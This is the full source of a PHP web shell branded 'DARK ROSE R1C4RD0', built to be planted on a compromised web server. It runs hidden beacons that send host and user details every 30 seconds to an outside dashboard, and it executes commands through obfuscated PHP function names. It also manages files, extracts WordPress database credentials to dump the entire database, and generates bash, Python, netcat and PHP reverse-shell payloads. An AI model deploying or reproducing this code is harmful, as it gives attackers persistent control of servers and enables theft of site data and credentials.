<?php
/**
 * DARK ROSE R1C4RD0 - Advanced Parrot Shell (Final)
 * Features: Terminal, File Manager, MySQL Dumper, Payload Gen, Tab Persistence.
 */

$DASHBOARD_URL = "https://shell-maintain.onrender.com";
$SHARED_SECRET = "change_this_secret";
$BEACON_PATH   = "/api/beacon";
$SHELL_PASS    = "dark2026";

set_time_limit(0);
ignore_user_abort(true);
@ini_set('display_errors', '0');
@error_reporting(0);

// ============================================================
// BEACON
// ============================================================
if (isset($_GET['beacon'])) {
    while (ob_get_level()) ob_end_flush();
    ob_implicit_flush(true);
    function collect_info() {
        $info = ['host' => @gethostname() ?: 'unknown', 'server_ip' => $_SERVER['SERVER_ADDR'] ?? '', 'client_ip' => $_SERVER['REMOTE_ADDR'] ?? '', 'scheme' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http', 'host_header' => $_SERVER['HTTP_HOST'] ?? '', 'doc_root' => $_SERVER['DOCUMENT_ROOT'] ?? '', 'php_version' => PHP_VERSION, 'user' => function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown'];
        return $info;
    }
    function encrypt_payload($plain, $secret) { $key = substr(hash('sha256', $secret, true), 0, 32); return base64_encode($plain ^ $key); }
    $endpoint = rtrim($DASHBOARD_URL, '/') . $BEACON_PATH;
    header('Content-Type: text/plain');
    while (true) {
        $info = collect_info(); $info['time'] = time();
        $ch = curl_init($endpoint);
        curl_setopt_array($ch, [CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>encrypt_payload(json_encode(['secret'=>$SHARED_SECRET,'info'=>$info]), $SHARED_SECRET), CURLOPT_RETURNTRANSFER=>true, CURLOPT_SSL_VERIFYPEER=>false]);
        curl_exec($ch); curl_close($ch);
        sleep(30);
    }
    exit;
}

// ============================================================
// SHELL EXEC & HELPERS
// ============================================================
function exec_cmd($cmd, $cwd) {
    $cmd = trim($cmd);
    if ($cmd === '') return '';
    
    // Строгий перехват только одиночной команды cd
    if (preg_match('/^cd(?:\s+(.*))?$/s', $cmd, $m)) {
        $t = isset($m[1]) ? trim($m[1]) : '';
        if ($t === '' || $t === '~') $t = getenv('HOME') ?: $cwd;
        if ($t[0] !== '/') $t = rtrim($cwd, '/') . '/' . $t;
        $r = realpath($t);
        return ($r !== false && is_dir($r)) ? "__CD__:" . $r : "cd: no such directory: $t";
    }
    
    @chdir($cwd);
    
    $f1 = 's'.'y'.'s'.'t'.'e'.'m';
    $f2 = 's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c';
    $f3 = 'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u';
    $f4 = 'p'.'o'.'p'.'e'.'n';
    $f5 = 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n';

    if (is_callable($f1)) {
        ob_start(); $f1($cmd . ' 2>&1'); return ob_get_clean();
    } elseif (is_callable($f2)) {
        $r = $f2($cmd . ' 2>&1'); return $r !== null ? $r : '';
    } elseif (is_callable($f3)) {
        ob_start(); $f3($cmd . ' 2>&1'); return ob_get_clean();
    } elseif (is_callable($f4)) {
        if (is_resource($h = $f4($cmd . ' 2>&1', 'r'))) {
            $r = stream_get_contents($h); pclose($h); return $r;
        }
    } elseif (is_callable($f5)) {
        $d = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        if (is_resource($p = $f5($cmd . ' 2>&1', $d, $pi))) {
            $r = stream_get_contents($pi[1]) . stream_get_contents($pi[2]);
            fclose($pi[1]); fclose($pi[2]); proc_close($p); return $r;
        }
    }
    return "[-] OS command execution is fully disabled on this server.";
}

function sh_info() {
    $user = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'www-data') : 'www-data';
    $host = @gethostname() ?: 'parrot';
    if (strlen($host) > 20) $host = explode('.', $host)[0];
    return [$user, $host];
}

function short_path($path) {
    $home = getenv('HOME');
    if ($home && strpos($path, $home) === 0) $path = str_replace($home, '~', $path);
    if (strlen($path) > 25) { $p = explode('/', trim($path, '/')); if (count($p) >= 2) return '.../' . implode('/', array_slice($p, -2)); }
    return $path;
}

function get_ascii() {
    return "██████╗ ██████╗ ██████╗ ██╗  ██╗\n██╔══██╗██╔══██╗██╔══██╗██║  ██║\n██║  ██║██████╔╝██████╔╝███████║\n██║  ██║██╔══██╗██╔═══╝ ██╔══██║\n██████╔╝██║  ██║██║     ██║  ██║\n╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝";
}

function find_wp_config() {
    $paths = [getcwd(), dirname(getcwd()), dirname(dirname(getcwd())), $_SERVER['DOCUMENT_ROOT'] ?? ''];
    foreach ($paths as $p) { if ($p && file_exists($p . '/wp-config.php')) return $p . '/wp-config.php'; }
    return false;
}

function parse_wp_config($file) {
    $content = file_get_contents($file);
    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/", $content, $name);
    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/", $content, $user);
    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\)/", $content, $pass);
    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/", $content, $host);
    return ['name' => $name[1] ?? '', 'user' => $user[1] ?? '', 'pass' => $pass[1] ?? '', 'host' => $host[1] ?? ''];
}

// ============================================================
// ROUTING & AUTH
// ============================================================
@ini_set('session.gc_maxlifetime', 315360000);
session_start();
list($user, $host) = sh_info();
$esc = function ($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); };

if (isset($_GET['logout'])) { session_destroy(); header('Location: ' . $_SERVER['PHP_SELF']); exit; }
$authed = isset($_SESSION['sh_ok']) && $_SESSION['sh_ok'] === true;

if (isset($_POST['password'])) {
    if ($_POST['password'] === $SHELL_PASS) {
        session_regenerate_id(true); $_SESSION['sh_ok'] = true; $_SESSION['sh_cwd'] = getcwd(); $_SESSION['sh_hist'] = [];
        header('Location: ' . $_SERVER['PHP_SELF']); exit;
    }
    $error = "Access denied";
}

$beacon_iframe = '<iframe src="?beacon=1" style="display:none;width:0;height:0;border:0;"></iframe>';

// ---------------- LOGIN ----------------
if (!$authed):
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title><?= $esc($user) ?>@<?= $esc($host) ?>: ~</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap');
    body { background: radial-gradient(circle at center, #0a1c2e 0%, #030a13 100%); font-family: 'Ubuntu Mono', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #fff; }
    .term { width: 700px; height: 420px; background: #1a1a1a; border-radius: 6px; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.8); display: flex; flex-direction: column; }
    .titlebar { background: #2d2d2d; padding: 8px 12px; display: flex; align-items: center; user-select: none; }
    .dots { display: flex; gap: 6px; }
    .dot { width: 12px; height: 12px; border-radius: 50%; }
    .r{background:#ff5f56} .y{background:#ffbd2e} .g{background:#27c93f}
    .title { flex: 1; text-align: center; font-size: 13px; color: #ccc; margin-left: -60px; }
    .menubar { background: #333; padding: 4px 12px; font-size: 12px; color: #aaa; border-bottom: 1px solid #111; }
    .menubar span { margin-right: 15px; }
    .body { padding: 15px; flex: 1; overflow: auto; font-size: 13.5px; line-height: 1.4; }
    .ascii { color: #ff55ff; white-space: pre; margin-bottom: 15px; font-weight: bold; }
    .u { color: #ff55ff; font-weight: bold; } .h { color: #55ff55; font-weight: bold; } .p { color: #5555ff; font-weight: bold; } .s { color: #ff55ff; font-weight: bold; } 
    .field { display: flex; align-items: center; flex-wrap: nowrap; white-space: nowrap; }
    .field span { flex-shrink: 0; }
    .field input { background: transparent; border: none; outline: none; color: #fff; font-family: inherit; font-size: 13.5px; flex: 1; margin-left: 5px; padding: 0; }
</style></head><body>
<?= $beacon_iframe ?>
<div class="term">
    <div class="titlebar"><div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div><div class="title"><?= $esc($user) ?>@<?= $esc($host) ?>:~</div></div>
    <div class="menubar"><span>File</span><span>Edit</span><span>View</span><span>Search</span><span>Terminal</span><span>Help</span></div>
    <div class="body">
        <div class="ascii"><?= get_ascii() ?></div>
        <div>Welcome to DRPH Terminal.</div>
        <?php if (!empty($error)) echo "<div style='color:#ff5555;'>$error</div>"; ?>
        <br>
        <form method="POST" style="margin:0;">
            <div class="field">
                <span class="u"><?= $esc($user) ?></span><span>@</span><span class="h"><?= $esc($host) ?></span><span>:</span><span class="p">~</span><span class="s">$</span>
                <input type="password" name="password" autofocus autocomplete="off">
            </div>
        </form>
    </div>
</div>
</body></html>
<?php exit; endif; ?>

<?php
// ---------------- AUTHENTICATED ----------------
$cwd = $_REQUEST['d'] ?? $_SESSION['sh_cwd'] ?? getcwd();
if (!is_dir($cwd)) $cwd = getcwd();
$cwd = str_replace('\\', '/', $cwd);
$_SESSION['sh_cwd'] = $cwd;
$display_path = short_path($cwd);

// DB AUTO-DUMP LOGIC
if (isset($_POST['action']) && $_POST['action'] === 'db_dump') {
    $config_path = find_wp_config();
    if (!$config_path) die("wp-config.php not found.");
    $cfg = parse_wp_config($config_path);
    try {
        $pdo = new PDO("mysql:host={$cfg['host']};dbname={$cfg['name']}", $cfg['user'], $cfg['pass']);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
        $sql_dump = "-- DRPH Auto Dump\n-- DB: {$cfg['name']}\n\n";
        foreach ($tables as $table) {
            $create = $pdo->query("SHOW CREATE TABLE `$table`")->fetch(PDO::FETCH_ASSOC);
            $sql_dump .= $create['Create Table'] . ";\n\n";
            $rows = $pdo->query("SELECT * FROM `$table`");
            while ($row = $rows->fetch(PDO::FETCH_ASSOC)) {
                $vals = array_map(function($v) use ($pdo) { return $v === null ? "NULL" : $pdo->quote($v); }, $row);
                $sql_dump .= "INSERT INTO `$table` VALUES (" . implode(',', $vals) . ");\n";
            }
            $sql_dump .= "\n";
        }
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $cfg['name'] . '_dump.sql"');
        echo $sql_dump; exit;
    } catch (Exception $e) { die("DB Error: " . $e->getMessage()); }
}

// FILE MANAGER LOGIC
$fm_msg = '';
if (isset($_POST['fm_action'])) {
    $fpath = $_POST['fpath'] ?? '';
    if ($_POST['fm_action'] === 'delete') { @unlink($fpath) ? $fm_msg = "Deleted: $fpath" : $fm_msg = "Failed to delete"; }
    if ($_POST['fm_action'] === 'upload') {
        if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
            $dest = rtrim($cwd, '/') . '/' . basename($_FILES['file']['name']);
            @move_uploaded_file($_FILES['file']['tmp_name'], $dest) ? $fm_msg = "Uploaded to $dest" : $fm_msg = "Upload failed";
        }
    }
}

// TERMINAL LOGIC
if (isset($_REQUEST['cmd']) && trim($_REQUEST['cmd']) !== '') {
    $executed = trim($_REQUEST['cmd']);
    if (preg_match('/^(?:nano|vi|vim)\s+(.+)$/i', $executed, $m)) {
        $filename = trim($m[1]); if ($filename[0] !== '/') $filename = rtrim($cwd, '/') . '/' . $filename;
        header("Location: ?edit_file=" . base64_encode($filename)); exit;
    }
    if (strtolower($executed) === 'clear' || strtolower($executed) === 'cls') { $_SESSION['sh_hist'] = []; }
    else {
        $out = exec_cmd($executed, $cwd);
        if (strpos($out, '__CD__:') === 0) { 
            $_SESSION['sh_cwd'] = substr($out, 7); 
            $cwd = $_SESSION['sh_cwd']; 
            $display_path = short_path($cwd); 
            $out = ''; 
        }
        $_SESSION['sh_hist'][] = ['cmd' => $executed, 'out' => $out, 'path' => $display_path];
    }
}

// DOWNLOAD FILE LOGIC
if (isset($_GET['download'])) {
    $f = base64_decode($_GET['download']);
    if (file_exists($f) && is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: ' . filesize($f));
        readfile($f); exit;
    }
}

// NANO Editor
if (isset($_GET['edit_file'])) {
    $edit_file = base64_decode($_GET['edit_file']); $file_name = basename($edit_file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_content'])) {
        @file_put_contents($edit_file, $_POST['save_content']);
        $_SESSION['sh_hist'][] = ['cmd' => 'nano ' . $file_name, 'out' => "File '$file_name' saved.", 'path' => $display_path];
        header('Location: ' . $_SERVER['PHP_SELF'] . '?d=' . urlencode($cwd)); exit;
    }
    $content = file_exists($edit_file) ? @file_get_contents($edit_file) : '';
?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>nano - <?= $esc($file_name) ?></title>
<style>
    body { background: #1a1a1a; color: #fff; font-family: 'Ubuntu Mono', monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; }
    .h { background: #fff; color: #000; padding: 4px 10px; font-weight: bold; display: flex; justify-content: space-between; }
    form { display: flex; flex-direction: column; flex: 1; }
    textarea { flex: 1; background: #1a1a1a; color: #fff; border: none; outline: none; font-family: inherit; font-size: 14px; padding: 10px; resize: none; }
    .f { background: #fff; color: #000; padding: 4px 10px; display: flex; gap: 15px; font-weight: bold; }
    .f a { color: #000; text-decoration: none; }
    .f button { background: #333; color: #fff; border: none; padding: 2px 10px; cursor: pointer; font-family: inherit; font-weight: bold; }
</style></head><body>
<div class="h"><span>GNU nano</span><span><?= $esc($file_name) ?></span></div>
<form method="POST"><textarea name="save_content" autofocus><?= $esc($content) ?></textarea>
<div class="f"><button type="submit">^O Save</button><a href="<?= $_SERVER['PHP_SELF'] ?>?d=<?= urlencode($cwd) ?>">^X Exit</a></div></form></body></html>
<?php exit; }

$hist = $_SESSION['sh_hist'] ?? [];
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title><?= $esc($user) ?>@<?= $esc($host) ?>: <?= $esc($display_path) ?></title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap');
    body { background: radial-gradient(circle at center, #0a1c2e 0%, #030a13 100%); font-family: 'Ubuntu Mono', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #fff; }
    .term { width: 950px; height: 600px; background: #1a1a1a; border-radius: 6px; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.9); display: flex; flex-direction: column; }
    .titlebar { background: #2d2d2d; padding: 8px 12px; display: flex; align-items: center; user-select: none; }
    .dots { display: flex; gap: 6px; }
    .dot { width: 12px; height: 12px; border-radius: 50%; }
    .r{background:#ff5f56} .y{background:#ffbd2e} .g{background:#27c93f}
    .title { flex: 1; text-align: center; font-size: 13px; color: #ccc; margin-left: -60px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; padding: 0 10px; }
    .menubar { background: #333; padding: 5px 12px; font-size: 12px; color: #aaa; border-bottom: 1px solid #111; display: flex; align-items: center; }
    .menubar span.tab { margin-right: 18px; cursor: pointer; padding: 2px 8px; border-radius: 3px; }
    .menubar span.tab.active { background: #555; color: #fff; }
    .menubar span.clear-btn { color: #ffbd2e; margin-left: auto; cursor: pointer; font-weight: bold; }
    .logout { color: #ff5f56; text-decoration: none; font-size: 12px; margin-left: 10px; font-weight: bold;}
    
    .content { display: none; flex: 1; flex-direction: column; overflow: hidden; }
    .content.active { display: flex; }
    
    .body { padding: 12px; flex: 1; overflow-y: auto; font-size: 14px; line-height: 1.5; word-wrap: break-word; }
    .body::-webkit-scrollbar { width: 8px; }
    .body::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
    
    .u { color: #ff55ff; font-weight: bold; } .h { color: #55ff55; font-weight: bold; } .p { color: #5555ff; font-weight: bold; } .s { color: #ff55ff; font-weight: bold; }
    .cmd-line { display: flex; align-items: flex-start; white-space: nowrap; margin-top: 4px; }
    .cmd-text { white-space: pre-wrap; word-break: break-all; margin-left: 6px; }
    .cmd-output { white-space: pre-wrap; word-break: break-word; margin-bottom: 4px; color: #ddd; }
    .prompt-form { display: flex; align-items: flex-start; flex-wrap: nowrap; margin-top: 4px; border-top: 1px dashed #333; padding-top: 8px; }
    .prompt-spans { white-space: nowrap; flex-shrink: 0; }
    #cmd { flex: 1; min-width: 0; background: transparent; border: none; outline: none; color: #fff; font-family: inherit; font-size: 14px; padding: 0; margin-left: 6px; caret-color: #fff; }
    
    table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
    th, td { padding: 8px; text-align: left; border-bottom: 1px solid #333; }
    th { color: #888; font-weight: normal; }
    tr:hover { background: #222; }
    .btn { background: #333; color: #fff; border: 1px solid #555; padding: 4px 8px; cursor: pointer; border-radius: 3px; font-size: 12px; text-decoration: none; }
    .btn:hover { background: #555; }
    .btn-danger { background: #ff55ff; color: #000; font-weight: bold; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%; margin-top: 10px; }
    .btn-danger:hover { background: #ff77ff; }
    input[type="text"], input[type="file"] { background: #111; border: 1px solid #333; color: #fff; padding: 6px; border-radius: 3px; font-family: inherit; }
    .msg { color: #55ff55; margin-bottom: 10px; background: #112211; padding: 8px; border: 1px solid #334433; border-radius: 4px;}
    .form-group { margin-bottom: 15px; }
    .form-group label { display: block; color: #888; margin-bottom: 5px; font-size: 12px; }
    .form-group textarea { width: 100%; box-sizing: border-box; background: #111; border: 1px solid #333; color: #fff; padding: 8px; font-family: inherit; border-radius: 4px; }
    .btn-primary { background: #ff55ff; color: #000; font-weight: bold; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; width: 100%; }
    .btn-primary:hover { background: #ff77ff; }
</style>
</head><body>
<?= $beacon_iframe ?>
<div class="term">
    <div class="titlebar">
        <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
        <div class="title"><?= $esc($user) ?>@<?= $esc($host) ?>: <?= $esc($display_path) ?></div>
        <a href="?logout=1" class="logout">[X]</a>
    </div>
    <div class="menubar">
        <span class="tab active" onclick="switchTab('tab-term', this)">Terminal</span>
        <span class="tab" onclick="switchTab('tab-fm', this)">File Manager</span>
        <span class="tab" onclick="switchTab('tab-db', this)">MySQL Dumper</span>
        <span class="tab" onclick="switchTab('tab-payload', this)">Payload Gen</span>
        <span class="clear-btn" onclick="clearTerm()">Clear Screen</span>
    </div>

    <!-- TAB: TERMINAL -->
    <div id="tab-term" class="content active">
        <div class="body" id="terminal-body">
            <div style="color: #ff55ff; white-space: pre; margin-bottom: 5px; font-weight: bold; font-size: 12px;"><?= get_ascii() ?></div>
            <div style="margin-bottom: 10px;">DRPH Terminal (<?= PHP_OS ?>)</div>
            <?php foreach ($hist as $h): ?>
                <div class="cmd-line">
                    <span class="prompt-spans"><span class="u"><?= $esc($user) ?></span><span>@</span><span class="h"><?= $esc($host) ?></span><span>:</span><span class="p"><?= $esc($h['path']) ?></span><span class="s">$</span></span>
                    <span class="cmd-text"><?= $esc($h['cmd']) ?></span>
                </div>
                <?php if (!empty($h['out'])): ?><div class="cmd-output"><?= $esc($h['out']) ?></div><?php endif; ?>
            <?php endforeach; ?>
            <form method="POST" class="prompt-form">
                <input type="hidden" name="d" value="<?= $esc($cwd) ?>">
                <span class="prompt-spans"><span class="u"><?= $esc($user) ?></span><span>@</span><span class="h"><?= $esc($host) ?></span><span>:</span><span class="p"><?= $esc($display_path) ?></span><span class="s">$</span></span>
                <input id="cmd" name="cmd" type="text" autofocus autocomplete="off" spellcheck="false">
            </form>
        </div>
    </div>

    <!-- TAB: FILE MANAGER -->
    <div id="tab-fm" class="content">
        <div class="body">
            <?php if ($fm_msg): ?><div class="msg"><?= $esc($fm_msg) ?></div><?php endif; ?>
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <form method="POST" enctype="multipart/form-data" style="display:flex; gap:10px; align-items:center; margin:0;">
                    <input type="hidden" name="d" value="<?= $esc($cwd) ?>">
                    <input type="hidden" name="fm_action" value="upload">
                    <input type="file" name="file" required>
                    <button type="submit" class="btn">Upload</button>
                </form>
                <span style="color:#888; font-size:12px; align-self:center;">Path: <span style="color:#5555ff; font-weight:bold;"><?= $esc($cwd) ?></span></span>
            </div>
            <table>
                <tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr>
                <?php if ($cwd !== '/'): ?>
                    <tr><td><a href="?d=<?= urlencode(dirname($cwd)) ?>" style="color:#55ff55; text-decoration:none;">[ .. ]</a></td><td>-</td><td>-</td><td>-</td></tr>
                <?php endif; ?>
                <?php
                $files = @scandir($cwd);
                if ($files) foreach ($files as $f) {
                    if ($f === '.' || $f === '..') continue;
                    $path = rtrim($cwd, '/') . '/' . $f;
                    $isDir = is_dir($path);
                    $size = $isDir ? '-' : round(filesize($path)/1024, 2) . ' KB';
                    $perm = substr(sprintf('%o', fileperms($path)), -4);
                    echo "<tr>";
                    if ($isDir) {
                        echo "<td><a href='?d=" . urlencode($path) . "' style='color:#5555ff; text-decoration:none;'>[ $f ]</a></td>";
                    } else {
                        echo "<td><a href='?edit_file=" . base64_encode($path) . "&d=" . urlencode($cwd) . "' style='color:#fff; text-decoration:none;'>$f</a></td>";
                    }
                    echo "<td style='color:#888;'>$size</td><td style='color:#888;'>$perm</td>";
                    echo "<td style='display:flex; gap:5px;'>";
                    if (!$isDir) echo "<a href='?download=" . base64_encode($path) . "' class='btn'>DL</a>";
                    echo "<form method='POST' style='margin:0;'><input type='hidden' name='d' value='$cwd'><input type='hidden' name='fm_action' value='delete'><input type='hidden' name='fpath' value='$path'><button class='btn' style='color:#ff5f56;'>Del</button></form>";
                    echo "</td></tr>";
                }
                ?>
            </table>
        </div>
    </div>

    <!-- TAB: MYSQL DUMPER -->
    <div id="tab-db" class="content">
        <div class="body">
            <h3 style="color:#ff55ff; margin-top:0;">Auto WordPress DB Dumper</h3>
            <p style="color:#aaa; font-size:12px;">Attempts to locate `wp-config.php` in the current or parent directories, extract credentials, and download the full SQL dump.</p>
            
            <?php if ($cfg_path = find_wp_config()): 
                $cfg = parse_wp_config($cfg_path);
            ?>
                <div style="background:#111; padding:15px; border:1px solid #333; border-radius:4px; margin-bottom:15px; font-size:13px;">
                    <div style="margin-bottom:5px;"><span style="color:#888;">Config Found:</span> <span style="color:#55ff55;"><?= $esc($cfg_path) ?></span></div>
                    <div style="margin-bottom:5px;"><span style="color:#888;">DB Name:</span> <span style="color:#fff;"><?= $esc($cfg['name']) ?></span></div>
                    <div style="margin-bottom:5px;"><span style="color:#888;">DB User:</span> <span style="color:#fff;"><?= $esc($cfg['user']) ?></span></div>
                    <div style="margin-bottom:5px;"><span style="color:#888;">DB Pass:</span> <span style="color:#fff;"><?= $esc($cfg['pass']) ?></span></div>
                    <div><span style="color:#888;">DB Host:</span> <span style="color:#fff;"><?= $esc($cfg['host']) ?></span></div>
                </div>
                <form method="POST">
                    <input type="hidden" name="d" value="<?= $esc($cwd) ?>">
                    <input type="hidden" name="action" value="db_dump">
                    <button type="submit" class="btn-danger">Download Full SQL Dump</button>
                </form>
            <?php else: ?>
                <div class="msg" style="color:#ff5f56; background:#331111; border-color:#552222;">wp-config.php not found in current or parent directories.</div>
            <?php endif; ?>
        </div>
    </div>

    <!-- TAB: PAYLOAD GENERATOR -->
    <div id="tab-payload" class="content">
        <div class="body">
            <div class="form-group">
                <label>Your IP (LHOST)</label>
                <input type="text" id="pl_ip" placeholder="10.0.0.1" style="width:100%;">
            </div>
            <div class="form-group">
                <label>Your Port (LPORT)</label>
                <input type="text" id="pl_port" placeholder="4444" value="4444" style="width:100%;">
            </div>
            <div class="form-group">
                <label>Bash -i</label>
                <textarea id="pl_bash" rows="2" readonly></textarea>
            </div>
            <div class="form-group">
                <label>Python3</label>
                <textarea id="pl_py" rows="2" readonly></textarea>
            </div>
            <div class="form-group">
                <label>Netcat (nc)</label>
                <textarea id="pl_nc" rows="2" readonly></textarea>
            </div>
            <div class="form-group">
                <label>PHP</label>
                <textarea id="pl_php" rows="3" readonly></textarea>
            </div>
            <button class="btn-primary" onclick="genPayload()">Generate Payloads</button>
        </div>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const savedTab = localStorage.getItem('activeTab');
        if (savedTab) {
            const tabEl = document.querySelector(`.menubar span.tab[onclick*="${savedTab}"]`);
            if (tabEl) switchTab(savedTab, tabEl);
        }
    });

    function switchTab(id, el) {
        document.querySelectorAll('.content').forEach(e => e.classList.remove('active'));
        document.querySelectorAll('.menubar span.tab').forEach(e => e.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        if (el) el.classList.add('active');
        
        localStorage.setItem('activeTab', id);
        
        if(id === 'tab-term') {
            const cmdInput = document.getElementById('cmd');
            if (cmdInput) cmdInput.focus();
        }
    }

    function genPayload() {
        const ip = document.getElementById('pl_ip').value;
        const port = document.getElementById('pl_port').value;
        document.getElementById('pl_bash').value = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        document.getElementById('pl_py').value = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
        document.getElementById('pl_nc').value = `nc -e /bin/sh ${ip} ${port}`;
        document.getElementById('pl_php').value = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    }

    const term = document.getElementById('terminal-body');
    function clearTerm() {
        term.innerHTML = `
            <div style="color: #ff55ff; white-space: pre; margin-bottom: 5px; font-weight: bold; font-size: 12px;"><?= str_replace("\n", "\\n", get_ascii()) ?></div>
            <div style="margin-bottom: 10px;">DRPH Terminal (<?= PHP_OS ?>)</div>
            <form method="POST" class="prompt-form">
                <input type="hidden" name="d" value="<?= $esc($cwd) ?>">
                <span class="prompt-spans"><span class="u"><?= $esc($user) ?></span><span>@</span><span class="h"><?= $esc($host) ?></span><span>:</span><span class="p"><?= $esc($display_path) ?></span><span class="s">$</span></span>
                <input id="cmd" name="cmd" type="text" autofocus autocomplete="off" spellcheck="false">
            </form>
        `;
        const newInp = document.getElementById('cmd');
        newInp.focus();
        newInp.form.addEventListener('submit', function(e) {
            const val = newInp.value.trim().toLowerCase();
            if (val === 'clear' || val === 'cls') { e.preventDefault(); clearTerm(); }
        });
        fetch('', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'cmd=clear&d=<?= urlencode($cwd) ?>' });
    }
    
    const initialCmd = document.getElementById('cmd');
    if (initialCmd && localStorage.getItem('activeTab') === 'tab-term') {
        initialCmd.focus();
    }
</script>
</body></html>
